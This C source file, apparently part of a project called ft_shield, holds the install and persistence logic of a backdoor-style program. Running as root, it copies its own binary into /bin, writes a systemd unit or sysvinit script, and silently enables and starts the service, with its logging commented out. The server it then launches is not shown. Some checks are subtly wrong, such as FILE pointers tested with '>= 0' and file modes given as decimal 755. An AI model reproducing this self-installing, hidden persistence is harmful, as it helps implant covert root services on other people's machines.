#include "ft_shield.h"


int get_parent()
{
	pid_t ppid = getppid();
	char cmdline[256];
	snprintf(cmdline, sizeof(cmdline), "/proc/%d/comm", ppid);
	FILE *fd = fopen(cmdline, "r");
	if (fd >= 0)
	{
		char parent_proc[256];
		fgets(parent_proc, sizeof(parent_proc), fd);
		// syslog(LOG_DEBUG, "parent process: %s\n", parent_proc);
		fclose(fd);
		if (strncmp(parent_proc, "systemd", 7) == 0) return 1;
		if (strncmp(parent_proc, "init", 4) == 0) return 2;
		if (strncmp(parent_proc, "bash", 4) == 0) return 3;
	}
	else
	{
		return -1;
	}
	return 0;
}

int get_init_system()
{
	// depricated since it can only detect if its systemd or not (ignoring sysvinit)
	// also vulnerable against env variable injection
	//
	// if (getenv("INVOCATION_ID"))
	// {
	//	syslog(LOG_INFO, "current process is recognized as systemd\n");
	// 	return 1;
	// }
	// return 0;
	FILE *fd = fopen("/proc/1/comm", "r");
	if (fd < 0)
	{
		// syslog(LOG_ERR, "failed to open file: /proc/1/comm\n");
		return -1;
	}
	char buffer[256];
	if (fgets(buffer, sizeof(buffer), fd))
	{
		if (strncmp(buffer, "systemd", 7) == 0)
		{
			// syslog(LOG_INFO, "current process is recognized as systemd\n");
			return 1;
		}
		else if (strncmp(buffer, "init", 4) == 0)
		{
			// syslog(LOG_INFO, "current process is recognized as sysvinit\n");
			return 2;
		}
		else
		{
			// syslog(LOG_INFO, "current process is using another system (OpenRC?)\n");
			return 3;
		}
	}
	else
	{
		// syslog(LOG_ERR, "failed to read file: /proc/1/comm\n");
		return -1;
	}
	fclose(fd);
	return -2;
}

int duplicate(char *exec_path)
{
	int	bin; // file descriptor of /bin/ft_shield
	int	usr; // file descriptor of program that user ran
	int	ret;
	char	buffer[1024];

	bin = open(BIN_PATH, O_CREAT | O_WRONLY | O_TRUNC, 755);
	if (bin < 0)
	{
		// syslog(LOG_ERR, "failed to write %s\n", BIN_PATH);
		return (-1);
	}
	usr = open(exec_path, O_RDONLY);
	if (usr < 0)
	{
		close(bin);
		// syslog(LOG_ERR, "failed to read %s\n", exec_path);
		return (-2);
	}
	while ((ret = read(usr, buffer, 1024)))
		write(bin, buffer, ret);
	close(bin);
	close(usr);
	// syslog(LOG_INFO, "%s has been duplicated into %s\n", exec_path, BIN_PATH);
	return (0);
}

int daemonize()
{
	// syslog(LOG_INFO, "daemonizing\n");
	int init_system = get_init_system();
	if (init_system == 1)
	{
		// syslog(LOG_INFO, "systemd: writing an unit: "SYSTEMD_PATH"ft_shield.service\n");
		int fd = open(SYSTEMD_PATH"ft_shield.service", O_CREAT | O_TRUNC | O_WRONLY, 0755);
		if (fd < 0)
		{
			// syslog(LOG_ERR, "failed to open or create file: "SYSTEMD_PATH"ft_shield.service\n");
			return -1;
		}
		if (write(fd, SYSTEMD_CONFIG, strlen(SYSTEMD_CONFIG)) == -1)
		{
			// syslog(LOG_ERR, "failed to write systemd service unit\n");
			return -1;
		}
		close(fd);
		chmod(SYSTEMD_PATH"ft_shield.service", 755);
		// syslog(LOG_INFO, "systemd: starting service\n");
		system("systemctl stop ft_shield > /dev/null 2>&1");
		system("systemctl daemon-reload > /dev/null 2>&1");
		system("systemctl enable ft_shield > /dev/null 2>&1");
		system("systemctl start ft_shield > /dev/null 2>&1");
	}
	else if (init_system == 2)
	{
		// syslog(LOG_INFO, "sysvinit: writing a script: "SYSVINIT_PATH"ft_shield");
		int fd = open(SYSVINIT_PATH"ft_shield", O_CREAT | O_TRUNC | O_WRONLY, 0755);
		if (fd < 0)
		{
			// syslog(LOG_ERR, "failed to open or create file: "SYSVINIT_PATH"ft_shield\n");
			return -2;
		}
		if (write(fd, SYSVINIT_CONFIG, strlen(SYSVINIT_CONFIG)) == -1)
		{
			// syslog(LOG_ERR, "failed to write sysvinit script\n");
			return -2;
		}
		close(fd);
		chmod(SYSVINIT_PATH"ft_shield", 755);
		// syslog(LOG_INFO, "sysvinit: starting service\n");
		system("update-rc.d ft_shield defaults > /dev/null 2>&1");
		system("service ft_shield start > /dev/null 2>&1");
	}
	return 0;
}

int main(int argc, char **argv)
{
	int	len;
	char	exec_path[256];

	if (geteuid())
	{
		printf("root permission required\n");
		return (-1);
	}
	// openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER);
	int parent = get_parent();
	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
	if (len != -1)
	{
		exec_path[len] = '\0';
		// syslog(LOG_DEBUG, "exec path: %s\n", exec_path);
	}
	else
	{
		// syslog(LOG_ERR, "readlink failed\n");
		return -1;
	}
	if (parent != 1 && parent != 2) // systemd && sysvinit
	{
		if (duplicate(exec_path) < 0) // copy binary to /bin directory
		{
			// syslog(LOG_ERR, "failed to duplicate the program\n");
			return -2;
		}
		if (daemonize() < 0)
		{
			// syslog(LOG_ERR, "failed to daemonize service\n");
			return -3;
		}
	}
	else
	{
		server();
	}
	// syslog(LOG_DEBUG, "process end: %s\n", exec_path);
	// closelog();
	return (0);
}
